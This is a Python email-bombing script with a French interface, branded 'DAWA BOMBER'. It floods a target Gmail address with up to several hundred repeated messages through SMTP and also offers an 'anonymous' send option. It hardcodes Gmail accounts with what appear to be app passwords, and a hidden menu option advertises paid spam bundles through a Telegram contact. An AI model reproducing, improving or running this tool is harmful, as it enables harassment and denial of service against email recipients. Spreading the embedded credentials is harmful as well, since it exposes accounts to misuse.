R = "\033[31m"
G = "\033[32m"
C = "\033[36m"
W = "\033[0m"

import time, os, random, sys, json, argparse, requests, smtplib, time
import subprocess as subp
import logging
from colorama import init, Fore, Back, Style  
init(autoreset=True)


row = []
info = ""
result = ""
systemR = "1.7.4"



def exit_error():
    print(Fore.RED + "Fonctionne uniquement avec Gmail.")
    sys.exit()

def cls():
        if sys.platform == "win32":
                os.system("cls")
        else:
                os.system("clear")


GMAIL_PORT = "587"
GMAIL_SSL_PORT = "465"
YAHOO_PORT = "587"
OUTLOOK_PORT = "587"
AOL_PORT = "587"
MAILRU_PORT = "465"

cls()

class bcolors:
        OKGREEN = "\033[92m"
        WARNING = "\033[0;33m"
        FAIL = "\033[91m"
        ENDC = "\033[0m"
        LITBU = "\033[94m"
        YELLOW = "\033[3;33m"
        CYAN = "\033[0;36"
        colors = ["\033[92m", "\033[91m", "\033[0;33m"]
        RAND = random.choice(colors)

class FG:
        black = "\033[30m"
        red = "\033[31m"
        green = "\033[32m"
        orange = "\033[33m"
        blue = "\033[34m"
        purple = "\033[35m"
        cyan = "\033[36m"
        lightgrey = "\033[37m"
        darkgrey = "\033[90m"
        lightred = "\033[91m"
        lightgreen = "\033[92m"
        yellow = "\033[93m"
        lightblue = "\033[94m"
        pink = "\033[95m"
        lightcyan = "\033[96m"


def start_bomb():
        cls()
        print(Fore.RED + """
[>] Préparation pour le spam et l"attaque ...""")

print()
print()
print(Fore.RED + """

██████████████████████████████████████████████████████████████████████████████████████████████████
█▌                                                                                              ▐█
█▌   ██████╗  █████╗ ██╗    ██╗ █████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ▐█
█▌   ██╔══██╗██╔══██╗██║    ██║██╔══██╗    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ▐█
█▌   ██║  ██║███████║██║ █╗ ██║███████║    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ▐█
█▌   ██║  ██║██╔══██║██║███╗██║██╔══██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ▐█
█▌   ██████╔╝██║  ██║╚███╔███╔╝██║  ██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ▐█
█▌   ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ▐█
█▌                                                                                              ▐█
██████████████████████████████████████████████████████████████████████████████████████████████████
      """)

print(Fore.RED + """                                                                               
[1] Bombe Gmail.
[2] Gmail Anonyme.
         """)

try:
        server = input(Fore.RED + "[=] Sélectionnez l'option : " + Fore.RED)
        if server == "4" or server == "04" or server == "exit" or server == "Exit" or server == "quit" or server == "Quit":
                print(Fore.RED + "Sortie de l'utilitaire ..." + Fore.RED)
                sys.exit()
        elif server == "1" or server == "01" or server == "gmail" or server == "Gmail":
                print(Fore.RED + "[+] fire.send482@gmail.com")
                print(Fore.RED + "[+] auto.send583@gmail.com")
                user = input(Fore.RED + "[=] Sélectionnez l'email (copier-coller) : " + Fore.RED)
                to = input(Fore.RED + "[=] Envoyer à : " + Fore.RED)
                subject = input(Fore.RED + "[=] Sujet : " + Fore.RED)
                body = input(Fore.RED + "[=] Message : " + Fore.RED)
                delay = input(Fore.RED + "[=] Vitesse d'envoi des lettres (1-5) : " + Fore.RED)
                nomes = int(input(Fore.RED + "[=] Nombre d'emails à envoyer (1-99) : " + Fore.RED))
                en0 = 600
                if en0 <= nomes:
                        cls()
                        print(Fore.RED + "denied access: Error \nsending maximum number 599")
                        time.sleep(2)
                        os.execl(sys.executable, sys.executable, *sys.argv)
        elif server == "2" or server == "02" or server == "anon" or server == "Anon":
                print("01. jiki.mioli08@gmail.com")
                print(Fore.RED + "example: jiki.mioli08@gmail.com" + Fore.RED)
                user = input(Fore.RED + "Select email: " + Fore.RED)
                to = input(Fore.RED + "Sent To : " + Fore.RED)
                subject = input(Fore.RED + "Subject : " + Fore.RED)
                body = input(Fore.RED + "Message : " + Fore.RED)
                delay = "1"
                delay_name = "special"
        elif server == "3" or server == "03" or server == "buy" or server == "Buy":
                print("15$ (USD) - 50 emails per 12th. For 1 week")
                print("30$ (USD) - 100 emails per 12th. For 1 week")
                print("50$ (USD) - 200 emails per 12th. For 1 week")
                print("85$ (USD) - 400 emails per 12th. For 1 week")
                print("")
                print("if you want to buy, write to Telegram: @ubp2q")
                exit()
        no = 0
        if to == "misakorzik528@gmail.com" or to == "miguardzecurity@gmail.com" or to == "korzikmisha@gmail.com":
                print(Fore.RED + "\nWhat?  seems to have failed to process \nyour request, please try another email." + Fore.RED)
                sys.exit(0)
        if delay == "1" or delay == "01":
                SPEED = .1
                delay_name = "fast"
        elif delay == "2" or delay == "02":
                SPEED = .3
                delay_name = "medium"
        elif delay == "3" or delay == "03":
                SPEED = .5
                delay_name = "slow"
        elif delay == "4" or delay == "04":
                SPEED = .7
                delay_name = "unhurried"
        elif delay == "5" or delay == "05":
                SPEED = .9
                delay_name = "snail"
        else:
                SPEED = .3
                delay_name = "default"

        message = "From: " + user + "\nSubject: " + subject + "\n" + body
except KeyboardInterrupt:
        print(Fore.RED + "Canceled! Quiting ..." + Fore.RED)
        sys.exit()


if server == "1" or server == "01" or server == "gmail" or server == "Gmail":
        if user == "fire.send482@gmail.com":
            pwd = "dpusbvnihmvncaob"
        elif user == "auto.send583@gmail.com":
            pwd = "awlgkpsurszifppt"
        start_bomb()
        print(Fore.RED + "Email: " + user + "  Target: " + to + "  Speed: " + delay_name)
        print("")
        server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
        print(Fore.RED + "Starting TLS - server0.starttls()")
        server.starttls()
        try:
                print(Fore.RED + "Connecting - server0.login(u, p)")
                server.login(user, pwd)
        except smtplib.SMTPAuthenticationError:
                try:
                        print(Fore.RED + "Reconnecting - server0.login(u, p)")
                        server.login(user, pwd)
                except smtplib.SMTPAuthenticationError:
                        try:
                                print(Fore.RED + "Reconnecting - server0.login(u, p)")
                                server.login(user, pwd)
                        except smtplib.SMTPAuthenticationError:
                                print(Fore.RED + "Error to connect! Please use a mini version, select option 5...")
                                sys.exit()
        for i in range(1, nomes+1):
                try:
                        server.sendmail(user, to, message)
                        print(Fore.RED + "[+] Message envoyé avec succès ! " + str(no+1) + " emails" + Fore.RED)
                        no += 1
                        time.sleep(SPEED)
                except KeyboardInterrupt:
                        print(Fore.RED + "\nTerminaling..." + Fore.RED)
                        sys.exit()
                except:
                        server.sendmail(user, to, message)
                        print(Fore.RED + "[+] Message envoyé avec succès ! " + str(no+1) + " emails" + Fore.RED)
                        no += 1
                        time.sleep(SPEED)
        server.close()
        print(Fore.YELLOW + "[!] Processus terminé !")

elif server == "2" or server == "02" or server == "anon" or server == "Anon":
        if user == "jiki.mioli08@gmail.com":
            pwd = "gzwjsohldzxdpteh"
        start_bomb()
        print(Fore.RED + "Email: " + user + "  Send To: " + to)
        print("")
        server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
        server.starttls()
        try:
                server.login(user, pwd)
        except smtplib.SMTPAuthenticationError:
                sys.exit()
        for i in range(1):
                try:
                        server.sendmail(user, to, message)
                        print(Fore.RED + "[+] Message envoyé avec succès ! " + str(no+1) + " emails" + Fore.RED)
                        no += 1
                        time.sleep(SPEED)
                except KeyboardInterrupt:
                        print(Fore.RED + "\nTerminaling..." + Fore.RED)
                        sys.exit()
                except:
                        print(Fore.RED + "Messange failed to Send! ")

else:
    sys.exit()
